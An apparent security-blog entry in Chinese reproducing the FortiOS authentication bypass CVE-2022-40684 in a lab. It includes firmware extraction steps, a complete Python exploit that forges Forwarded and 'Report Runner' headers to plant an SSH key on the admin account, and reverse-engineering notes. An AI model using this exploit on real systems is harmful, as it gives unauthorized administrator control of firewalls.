  <entry>
    <title>CVE-2022-40684复现</title>
    <link href="/2025/01/01/CVE-2022-40684/"/>
    <url>/2025/01/01/CVE-2022-40684/</url>
    
    <content type="html"><![CDATA[<p>逻辑漏洞</p><p>身份验证绕过漏洞<br>攻击者通过向易受攻击的目标发送特制的 HTTP 或 HTTPS 请求进行绕过身份认证以管理员身份在控制面板中执行任意操作</p><h1 id="提取httpsd"><a href="#提取httpsd" class="headerlink" title="提取httpsd"></a>提取httpsd</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><br>sudo apt update  <br>sudo apt install libguestfs-tools<br><br>guestmount -a fortios.vmdk -m <span class="hljs-string">/dev/sda1</span> <span class="hljs-params">--ro</span> fgt_mount<br><br><span class="hljs-keyword">cd</span> fgt_mount &amp; cp rootfs.gz <span class="hljs-string">../</span> &amp; <span class="hljs-keyword">cd</span> <span class="hljs-string">..</span><br><br>gunzip rootfs.gz<br><br><span class="hljs-keyword">cd</span> rootfile<br>cpio -i 2&gt; <span class="hljs-string">/dev/null</span> &lt; <span class="hljs-string">../rootfs</span><br><br><br>尝试查找其他的解压bin.tar.xz<br>find . -name xz<br><span class="hljs-string">./sbin/xz</span> <span class="hljs-params">--decompress</span> *<span class="hljs-string">.xz</span><br>发生错误，修改了xz的动态连接器的路径，改至主机系统的链接器路径<br>patchelf <span class="hljs-params">--set-interpreter</span> <span class="hljs-string">/lib64/ld-linux-x86-64.so.2</span> sbin/xz<br><span class="hljs-string">./sbin/xz</span> <span class="hljs-params">--decompress</span> *<span class="hljs-string">.xz</span><br><span class="hljs-keyword">ls</span> *<span class="hljs-string">.tar</span><br><br>tar -xvf bin.tar<br><br></code></pre></td></tr></table></figure><p>bin目录后寻找httpsd程序。httpsd是init程序的软连接。<br>逆之前先看看fgt调试信息</p><h1 id="fgt开调试，执行POC"><a href="#fgt开调试，执行POC" class="headerlink" title="fgt开调试，执行POC"></a>fgt开调试，执行POC</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">生成rsa秘钥<br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;test&quot;</span><br>(/home/pcl/.ssh/id_rsa)<br><br>打开FGT调试<br>diagnose <span class="hljs-built_in">debug</span> <span class="hljs-built_in">enable</span><br>diagnose <span class="hljs-built_in">debug</span> application httpsd -1<br>diagnose <span class="hljs-built_in">debug</span> cli 8<br><br>执行POC<br>python3 cve-2022-40684.py -t 192.168.89.72 --username admin --key-file ~/.ssh/id_rsa.pub<br>[+] SSH key <span class="hljs-keyword">for</span> admin added successfully!<br><br></code></pre></td></tr></table></figure><p>公钥被写到了 &#x2F;api&#x2F;v2&#x2F;cmdb&#x2F;system&#x2F;admin&#x2F;admin</p><figure class="highlight python"><figcaption><span>title:cve-2022-40684.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br>requests.packages.urllib3.disable_warnings()<br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br><span class="hljs-comment">#python3 cve-2022-40684.py -t 192.168.89.72 --username admin --key-file ~/.ssh/id_rsa.pub</span><br><br>HEADERS = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Report Runner&#x27;</span>,<br>    <span class="hljs-string">&#x27;Forwarded&#x27;</span>: <span class="hljs-string">&#x27;for=&quot;[127.0.0.1]:8888&quot;;by=&quot;[127.0.0.1]:8888&quot;&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_key</span>(<span class="hljs-params">key_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(key_file) <span class="hljs-keyword">as</span> f:<br>        k = f.read().strip()<br><br>    <span class="hljs-keyword">return</span>(k)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_key</span>(<span class="hljs-params">target, username, key_file</span>):<br>    key = format_key(key_file)<br>    j = &#123;<br>        <span class="hljs-string">&quot;ssh-public-key1&quot;</span>: <span class="hljs-string">&#x27;\&quot;&#x27;</span> + key + <span class="hljs-string">&#x27;\&quot;&#x27;</span><br>    &#125;<br>    url = <span class="hljs-string">f&#x27;https://<span class="hljs-subst">&#123;target&#125;</span>/api/v2/cmdb/system/admin/<span class="hljs-subst">&#123;username&#125;</span>&#x27;</span><br>    r = requests.put(url, headers=HEADERS, json=j, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;SSH key is good&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[-] <span class="hljs-subst">&#123;target&#125;</span> is not vulnerable!&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[+] SSH key for <span class="hljs-subst">&#123;username&#125;</span> added successfully!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--target&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The IP address of the target&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--username&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The user to add an SSH key file for&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-k&#x27;</span>, <span class="hljs-string">&#x27;--key-file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The SSH key file&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    args = parser.parse_args()<br><br>    add_key(args.target, args.username, args.key_file)<br><br></code></pre></td></tr></table></figure><p>调试信息<br><img src="/img/20260126165729.png"></p><p>从init看起，api怎么被调用的</p><ol><li>搜索字符串fweb_debug_init，定位fweb_debug_init函数，<br>收集一个会话请求的相关信息，a1是会话上下文，请求</li></ol><p><img src="/img/20260127205502.png"></p><ol start="2"><li><p>交叉引用，向上跟函数fweb_debug_init_2<br>分配内存、初始化全局指针，无调试信息相关</p></li><li><p>向上跟函数sub_C14D20<br>发现调试信息中出现的fweb_debug_final，再init和final之间，有两个函数，对会话做了处理<br><img src="/img/20260127210049.png"></p></li><li><p>第一个函数v3<br>来自a2，a2来自第二个参数a2<br><img src="/img/20260127210329.png"><br>再向上跟，v3是从&amp;off_3F3DD60开始的数组<br><img src="/img/20260127210550.png"></p></li></ol><p><img src="/img/20260127210605.png"></p><p>在sub_C14D20中，根据会话标签，当前会话已经被分配好的 Handler 名称和v3数组里的handler函数进行循环匹配，匹配上的handler函数对a1做相应处理</p><ol start="5"><li>第二个函数sub_C14B30，生成 API 访问日志。之后fweb_debug_final，完成了这次的请求。</li></ol><hr><p>上面是api的调用流程，下面具体分析api_access_check_for_trusted_access</p><ol><li>搜索字符串api_access_check_for_trusted_access找到所在函数</li></ol><p>apr_table_get提取头部信息，没有”X-AUTH-FGFM”头，Node.js_1&#x3D;0<br><img src="/img/20260126221947.png"></p><p>sub_C194B0()判断是不是fgfm，不是返回0<br><img src="/img/20260126223836.png"></p><p>sub_C196F0()判断ip是不是127.0.0.1 以及 UA是不是node.js，不是，v5&#x3D;0<br><img src="/img/20260126225156.png"></p><p>Node.js_1为0 跳过    if ( Node.js_1 )，进入   if ( sub_C196F0(a1, “Report Runner”) )，判断UA是不是Report Runner，是。<br>sub_1EB0EC0()打印日志<br><img src="/img/20260126224849.png"><br>sub_279D980(“Report Runner”) 进行身份转换，会话标记为daemon_admin<br><img src="/img/20260126230015.png"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">ssh登陆<br>pcl<span class="hljs-variable">@pcl</span>-<span class="hljs-title class_">VMware</span>-<span class="hljs-title class_">Virtual</span>-<span class="hljs-title class_">Platform</span><span class="hljs-symbol">:~/</span><span class="hljs-number">2500</span>/fgt/<span class="hljs-number">720</span><span class="hljs-variable">$ </span>ssh -o <span class="hljs-title class_">HostKeyAlgorithms</span>=+ssh-rsa -o <span class="hljs-title class_">PubkeyAcceptedAlgorithms</span>=+ssh-rsa -i ~<span class="hljs-regexp">/.ssh/id</span>_rsa admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.89</span>.<span class="hljs-number">72</span><br><span class="hljs-variable constant_">FGVM32YHI1M5K71R</span> <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
